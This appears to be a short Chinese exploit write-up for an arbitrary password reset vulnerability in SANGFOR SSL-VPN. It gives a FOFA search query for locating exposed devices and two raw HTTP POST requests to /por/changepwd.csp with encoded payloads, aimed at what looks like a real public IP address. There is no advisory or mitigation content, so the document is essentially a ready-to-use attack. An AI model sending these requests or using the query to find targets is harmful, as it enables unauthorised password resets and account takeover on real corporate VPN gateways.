# 深信服 SSL VPN 任意密码重置漏洞

    SANGFOR SSL-VPN Arbitrary password reset vulnerability

## fofa

```
app="SANGFOR-SSL-VPN" && icon_hash="-693794744"
```

## exp

```
POST /por/changepwd.csp HTTP/1.1
Host: 103.139.212.214
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
Content-Length: 172

sessReq=clusterd&sessid=0&str=26c2ebe58a8274ba6c3dbe6051e9d406a9122b7218ca21951330e1c8a968aeee5330fb838553b5d5101856fab8e0a0463921543cb63c6e47c0447e749a55d7ae210f68&len=134
```

```
POST /por/changepwd.csp HTTP/1.1
Host: 103.139.212.214
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
Content-Length: 172

sessReq=clusterd&sessid=0&str=6b83b24fdb5a1d451490f8b55fb09cd5287a942904fd6c23036e20884ced906921040534f18f514ff649127ec52d5664c491c655b3fa617b9f3ebcca9b3b74099fe783&len=134
```

![image](https://s1.ax1x.com/2023/02/14/pSoLl4J.png)
